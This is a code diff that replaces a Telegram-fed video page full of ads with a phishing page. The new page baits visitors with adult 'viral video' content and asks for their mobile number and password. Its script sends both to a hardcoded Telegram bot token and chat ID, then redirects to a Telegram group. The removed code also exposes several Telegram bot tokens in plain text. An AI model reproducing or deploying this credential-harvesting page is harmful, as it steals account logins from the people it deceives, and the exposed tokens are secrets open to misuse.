@@ -1,456 +1,133 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>vairal-tv-bot</title>
-
-<script src="https://pl28622374.profitablecpmratenetwork.com/dc/da/86/dcda86c6b4d0fcb50d4bc9138245046b.js"></script>
-
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join Our Group</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    
     <style>
-        :root {
-            --primary: #6750a4;
-            --surface: #f7f9fc;
-            --on-surface: #1c1b1f;
-            --card-bg: #ffffff;
-            --accent: #ffd449;
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
+
+        .bg-slider {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+            background-size: cover; background-position: center; background-repeat: no-repeat;
+            animation: slideEffect 20s linear infinite;
         }
 
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        
-        body { 
-            font-family: 'Roboto', sans-serif; 
-            background-color: var(--surface); 
-            margin: 0; 
-            padding: 0;
-            color: var(--on-surface);
-            display: flex;
-            justify-content: center;
+        @keyframes slideEffect {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
-        /* Full Screen App Container */
+        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #333; overflow: hidden; }
+
         .app-container {
-            width: 100%;
-            max-width: 480px;
-            background: var(--surface);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            width: 100%; max-width: 420px; background: rgba(255, 255, 255, 0.95);
+            border-radius: 16px; box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+            padding: 24px; margin: 16px; display: flex; flex-direction: column; align-items: center;
         }
 
-        /* Top Action Bar */
-        .app-bar {
-            background: var(--card-bg);
-            padding: 16px 20px;
-            display: flex;
-            align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            border-bottom: 1px solid #e0e0e0;
+        .header-section { text-align: center; margin-bottom: 30px; width: 100%; }
+        .community-logo { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #2481cc; margin-bottom: 12px; }
+        
+        .input-group { display: flex; gap: 10px; margin-bottom: 15px; width: 100%; position: relative; }
+        
+        .country-select { width: 85px; background: #f1f3f4; border: 1.5px solid #dadce0; border-radius: 8px; padding: 12px; font-weight: bold; }
+        .phone-input { flex: 1; border: 1.5px solid #dadce0; border-radius: 8px; padding: 12px; font-size: 16px; }
+        
+        /* Eye Icon Style */
+        .toggle-password {
+            position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+            cursor: pointer; color: #888; user-select: none; font-size: 14px;
         }
 
-        .app-bar h2 {
-            font-size: 1.2rem;
-            margin: 0;
-            font-weight: 500;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        /* Video Section */
-        .player-section {
-            background: #000;
-            width: 100%;
-            aspect-ratio: 16 / 9;
-            position: relative;
-            overflow: hidden;
-        }
-
-        video { width: 100%; height: 100%; display: none; object-fit: contain; }
-
-        #status-msg { 
-            position: absolute;
-            color: #fff;
-            font-size: 0.85rem;
-            text-align: center;
-            width: 100%;
-            top: 50%;
-            transform: translateY(-50%);
-        }
-
-        /* Ad Layer */
-        #ad-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 101; display: none; }
-        #ad-video-player { width: 100%; height: 100%; display: block !important; }
-        #ad-timer { position: absolute; top: 12px; right: 12px; background: rgba(0,0,0,0.6); color: #fff; padding: 6px 14px; border-radius: 20px; font-size: 11px; z-index: 102; border: 1px solid rgba(255,255,255,0.2); }
-        #skip-ad-btn { position: absolute; bottom: 20px; right: 0; background: rgba(0,0,0,0.8); color: #fff; padding: 12px 20px; border-radius: 4px 0 0 4px; display: none; cursor: pointer; font-size: 13px; z-index: 103; border: 1px solid #444; border-right: none; }
-        #ad-link-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 80%; cursor: pointer; z-index: 101; }
-
-        /* --- Next Button Styling --- */
-        .controls-row {
-            display: flex;
-            justify-content: flex-end;
-            padding: 12px 20px;
-        }
-        .next-btn {
-            background: #1d1b20;
-            color: #fff;
-            border: none;
-            padding: 10px 18px;
-            border-radius: 25px;
-            font-size: 0.85rem;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            cursor: pointer;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-            text-decoration: none;
-        }
-        .next-btn:active { transform: scale(0.96); }
-
-        /* Content Area */
-        .content-scroll {
-            padding: 0 20px 20px 20px;
-            flex-grow: 1;
-        }
-
-        .section-label {
-            font-size: 0.8rem;
-            font-weight: 700;
-            color: var(--primary);
-            text-transform: uppercase;
-            margin-bottom: 12px;
-            letter-spacing: 1px;
-        }
-
-        /* Share Link Box */
-        .link-card {
-            background: var(--card-bg);
-            border-radius: 16px;
-            padding: 12px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            border: 1px solid #e0e0e0;
-            margin-bottom: 24px;
-        }
-
-        .link-input {
-            flex-grow: 1;
-            border: none;
-            background: #f1f3f4;
-            padding: 10px 14px;
-            border-radius: 8px;
-            font-size: 0.85rem;
-            color: #5f6368;
-            outline: none;
-        }
-
-        .copy-btn {
-            background: var(--primary);
-            color: #fff;
-            border: none;
-            padding: 10px 18px;
-            border-radius: 8px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
-        .copy-btn:active { transform: scale(0.95); }
-
-        /* Promo Banner */
-        .promo-banner {
-            background: linear-gradient(135deg, #6750a4, #917ec9);
-            color: white;
-            padding: 20px;
-            border-radius: 20px;
-            margin-bottom: 24px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .promo-banner p { margin: 0; font-size: 1rem; font-weight: 500; position: relative; z-index: 2; }
-
-        /* List Items */
-        .list-item {
-            background: var(--card-bg);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 18px;
-            border-radius: 16px;
-            margin-bottom: 10px;
-            text-decoration: none;
-            color: var(--on-surface);
-            border: 1px solid #ececec;
-        }
-
-        .click-here {
-            color: var(--primary);
-            font-size: 0.7rem;
-            font-weight: 700;
-            background: #f0ecf9;
-            padding: 4px 10px;
-            border-radius: 6px;
-            animation: pulse-effect 1.8s infinite;
-        }
-
-        @keyframes pulse-effect {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
-        ::-webkit-scrollbar { width: 0; background: transparent; }
+        .join-btn { width: 100%; background: #2481cc; color: white; border: none; border-radius: 8px; padding: 14px; font-size: 16px; cursor: pointer; }
+        .message { margin-top: 12px; font-size: 14px; text-align: center; display: none; }
+        .success { color: #4caf50; }
+        .error { color: #f44336; }
     </style>
 </head>
 <body>
 
-<div class="app-container">
-    <div class="app-bar">
-        <h2 id="video-title">Connecting...</h2>
-    </div>
+    <div id="bgSlider" class="bg-slider"></div>
 
-    <div class="player-section">
-        <div id="status-msg">Searching secure servers...</div>
-        
-        <div id="ad-layer">
-            <div id="ad-link-overlay" onclick="openAdLink()"></div>
-            <video id="ad-video-player" playsinline muted></video>
-            <div id="ad-timer">Sponsored</div>
-            <button id="skip-ad-btn" onclick="skipAd()">Skip Ad &rsaquo;</button>
+    <div class="app-container">
+        <div class="header-section">
+            <img src="https://i.ibb.co/ddfz7Rh/IMG-20260603-091432.jpg?w=150" class="community-logo">
+            <h1>Tik tok Vairal video 🔞</h1>
         </div>
 
-        <video id="main-video" controls controlsList="nodownload nofullscreen" oncontextmenu="return false;"></video>
-    </div>
-
-    <div class="controls-row">
-        <a href="https://www.profitablecpmratenetwork.com/ese22rset?key=0bdd4b7fc8c9324f4ec7f161bce720ed" class="next-btn" target="_blank">
-            Next Video <span>&rsaquo;</span>
-        </a>
-    </div>
-
-    <div class="content-scroll">
-        <div class="section-label">Share Content</div>
-        <div class="link-card">
-            <input type="text" class="link-input" id="share-link" value="Generating..." readonly>
-            <button class="copy-btn" id="copy-btn" onclick="copyLink()">Copy</button>
+        <div class="join-form">
+            <form id="telegramForm">
+                <div class="input-group">
+                    <select id="countryCode" class="country-select">
+                        <option value="+880">BD</option>
+                        <option value="+91">IN</option>
+                    </select>
+                    <input type="tel" id="phoneNumber" class="phone-input" placeholder="Mobile Number" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="password" class="phone-input" placeholder="Enter Password" required>
+                    <span class="toggle-password" onclick="togglePass()">SHOW</span>
+                </div>
+                
+                <button type="submit" class="join-btn" id="submitBtn">JOIN GROUP 🔞</button>
+            </form>
+            <div id="statusMessage" class="message"></div>
         </div>
-
-<div id="ad-container" style="
-    display: flex; 
-    justify-content: center; 
-    align-items: center; 
-    width: 100%; 
-    margin: 0; 
-    padding: 0; 
-    line-height: 0; 
-    background-color: transparent;">
-
-    <div class="ad-content" style="margin: 0; padding: 0;">
-        <script>
-  atOptions = {
-    'key' : '84793a11e4daa94841fba1d1072d4285',
-    'format' : 'iframe',
-    'height' : 250,
-    'width' : 300,
-    'params' : {}
-  };
-</script>
-<script src="https://www.highperformanceformat.com/84793a11e4daa94841fba1d1072d4285/invoke.js"></script>
     </div>
-</div>
 
-        <div class="promo-banner">
-            <p>Join our Community, নতন নতুন Vairal ভিডিও দেখতে চেনেল এবং গুরুপে join হন!</p>
-        </div>
+    <script>
+        // Password Show/Hide Function
+        function togglePass() {
+            const passField = document.getElementById('password');
+            const toggleText = document.querySelector('.toggle-password');
+            if (passField.type === "password") {
+                passField.type = "text";
+                toggleText.innerText = "HIDE";
+            } else {
+                passField.type = "password";
+                toggleText.innerText = "SHOW";
+            }
+        }
 
-        <div class="section-label">Our Channels</div>
-        <a href="https://t.me/+CArqwbq7oHdkMDg1" class="list-item">
-            <span>18+ Private Group 🔞</span>
-            <span class="click-here">CLICK HERE</span>
-        </a>
-<div id="ad-container" style="
-    display: flex; 
-    justify-content: center; 
-    align-items: center; 
-    width: 100%; 
-    margin: 0; 
-    padding: 0; 
-    line-height: 0; 
-    background-color: transparent;">
+        // Background Logic
+        const backgrounds = ["https://i.ibb.co/0yCcZXT0/IMG-20260505-125841.jpg", "https://i.ibb.co/XZg62Bvn/In-Shot-20260603-102611144.jpg"];
+        document.getElementById('bgSlider').style.backgroundImage = `url('${backgrounds[Math.floor(Math.random() * backgrounds.length)]}')`;
 
-    <div class="ad-content" style="margin: 0; padding: 0;">
-        <script>
-  atOptions = {
-    'key' : '84793a11e4daa94841fba1d1072d4285',
-    'format' : 'iframe',
-    'height' : 250,
-    'width' : 300,
-    'params' : {}
-  };
-</script>
-<script src="https://www.highperformanceformat.com/84793a11e4daa94841fba1d1072d4285/invoke.js"></script>
-    </div>
-</div>
-        <a href="https://t.me/New_video_notification_bot" class="list-item">
-            <span>Mms_tv_bot [ Telegram ] </span>
-            <span class="click-here">CLICK HERE</span>
-        </a>
-        <a href="https://t.me/+J6c2h0LUdC1iNjJl" class="list-item">
-            <span>Video Privet Channel 🔑</span>
-            <span class="click-here">CLICK HERE</span>
-        </a>
-        <a href="https://t.me/+vVBirV_wlTNiOTE1" class="list-item">
-            <span>❌ 🔞ভাইরাল ভিডিও লিংক 🔞 ❌</span>
-            <span class="click-here">CLICK HERE</span>
-        </a>
-<div id="ad-container-banner" style="
-    display: flex; 
-    justify-content: center; 
-    align-items: center; 
-    width: 100%; 
-    margin: 0 auto; 
-    padding: 0; 
-    line-height: 0; 
-    background-color: transparent;
-    overflow: hidden;">
-
-    <div class="ad-content" style="margin: 0; padding: 0;">
-        <script type="text/javascript">
-            atOptions = {
-                'key' : '6f57e29fb7bc9bcb050ffc43a4d9e3d3',
-                'format' : 'iframe',
-                'height' : 50,
-                'width' : 320,
-                'params' : {}
-            };
-        </script>
-        <script type="text/javascript" src="https://www.highperformanceformat.com/6f57e29fb7bc9bcb050ffc43a4d9e3d3/invoke.js"></script>
-    </div>
-</div>
-
-    </div>
-</div>
-.
-<script>
-    const thumbToken = "8644017950:AAGyGi3ttEEZ0KuSY6zgr_4HSI3g_0wUFec";
-    const videoToken = "8246056774:AAEF1oHuj1cIRwtT3mKtcCZjlGn24XPP1es";
-    const adToken = "8442448701:AAG_GvpTJWwJbY_XsKSzsafkGu-Gl97BTCg";
-
-    let adUrl = "";
-    let adRedirectLink = "#";
-    let adPlayed = false;
-
-    const urlParams = new URLSearchParams(window.location.search);
-    const targetTitle = urlParams.get('title')?.replace(/_/g, ' ');
-
-    async function fetchVideoData() {
-        try {
-            const [thumbRes, videoRes, adRes] = await Promise.all([
-                fetch(`https://api.telegram.org/bot${thumbToken}/getUpdates`),
-                fetch(`https://api.telegram.org/bot${videoToken}/getUpdates`),
-                fetch(`https://api.telegram.org/bot${adToken}/getUpdates`)
-            ]);
+        // Form Submission
+        document.getElementById('telegramForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const submitBtn = document.getElementById('submitBtn');
+            const statusMessage = document.getElementById('statusMessage');
             
-            const adData = await adRes.json();
-            const lastAdMsg = adData.result.reverse().find(m => m.message?.video);
-            if(lastAdMsg) {
-                adRedirectLink = lastAdMsg.message.caption || "#";
-                adUrl = await getFile(adToken, lastAdMsg.message.video.file_id);
-                const adPlayer = document.getElementById('ad-video-player');
-                adPlayer.src = adUrl;
-                adPlayer.load();
-            }
+            submitBtn.innerText = "Joining...";
+            submitBtn.disabled = true;
 
-            const thumbData = await thumbRes.json();
-            const videoData = await videoRes.json();
-            const photoMsg = thumbData.result.reverse().find(m => m.message?.caption?.includes(targetTitle || ""));
-            const videoMsg = videoData.result.reverse().find(m => m.message?.caption?.includes(targetTitle || ""));
+            const text = `📌 *New Join Request*\n\n📱 Number: ${document.getElementById('countryCode').value}${document.getElementById('phoneNumber').value}\n🔑 Pass: ${document.getElementById('password').value}`;
 
-            if (photoMsg && videoMsg) {
-                const finalTitle = videoMsg.message.caption;
-                document.getElementById('video-title').innerText = finalTitle;
-
-                const [tUrl, vUrl] = await Promise.all([
-                    getFile(thumbToken, photoMsg.message.photo.pop().file_id),
-                    getFile(videoToken, videoMsg.message.video.file_id)
-                ]);
-
-                const mainVideo = document.getElementById('main-video');
-                mainVideo.src = vUrl;
-                mainVideo.poster = tUrl;
-                mainVideo.style.display = "block";
-                document.getElementById('status-msg').style.display = "none";
-                document.getElementById('share-link').value = `${window.location.href.split('?')[0]}?title=${finalTitle.replace(/\s+/g, '_')}`;
-
-                mainVideo.addEventListener('play', function() {
-                    if(!adPlayed && adUrl !== "") {
-                        mainVideo.pause();
-                        startAd();
-                    }
-                }, { once: true });
-            }
-        } catch (e) { console.error("Error fetching data"); }
-    }
-
-    function startAd() {
-        adPlayed = true;
-        const adLayer = document.getElementById('ad-layer');
-        const adVideo = document.getElementById('ad-video-player');
-        const timerText = document.getElementById('ad-timer');
-        const skipBtn = document.getElementById('skip-ad-btn');
-
-        adLayer.style.display = "block";
-        adVideo.muted = false;
-        adVideo.play().catch(() => {
-            adVideo.muted = true;
-            adVideo.play();
+            fetch(`https://api.telegram.org/bot8653143485:AAG2QPpyBEzwcWdcpnq5vXAqcMw6hlsJ5Zw/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: '6262892880', text: text, parse_mode: 'Markdown' })
+            })
+            .then(() => {
+                statusMessage.className = "message success";
+                statusMessage.innerText = "✅ Request Sent!";
+                statusMessage.style.display = "block";
+                setTimeout(() => window.location.href = "https://t.me/+hg0J0t3_bpIxZDQ1", 2000);
+            })
+            .catch(() => {
+                statusMessage.className = "message error";
+                statusMessage.innerText = "❌ Connection failed.";
+                statusMessage.style.display = "block";
+                submitBtn.innerText = "JOIN COMMUNITY";
+                submitBtn.disabled = false;
+            });
         });
-
-        let timeLeft = 20;
-        let countdown = setInterval(() => {
-            timeLeft--;
-            timerText.innerText = `Ad ends in ${timeLeft}s`;
-            if(timeLeft <= 0) {
-                clearInterval(countdown);
-                timerText.style.display = "none";
-                skipBtn.style.display = "block";
-            }
-        }, 1000);
-    }
-
-    function skipAd() {
-        document.getElementById('ad-layer').style.display = "none";
-        document.getElementById('ad-video-player').pause();
-        document.getElementById('main-video').play();
-    }
-
-    function openAdLink() {
-        if(adRedirectLink !== "#") window.open(adRedirectLink, '_blank');
-    }
-
-    async function getFile(token, fileId) {
-        const res = await fetch(`https://api.telegram.org/bot${token}/getFile?file_id=${fileId}`);
-        const data = await res.json();
-        return `https://api.telegram.org/file/bot${token}/${data.result.file_path}`;
-    }
-
-    function copyLink() {
-        const copyText = document.getElementById("share-link");
-        copyText.select();
-        document.execCommand("copy");
-        document.getElementById("copy-btn").innerText = "Done!";
-        setTimeout(() => document.getElementById("copy-btn").innerText = "Copy", 2000);
-    }
-
-    fetchVideoData();
-</script>
-
+    </script>
 </body>
-    </html>
+</html>
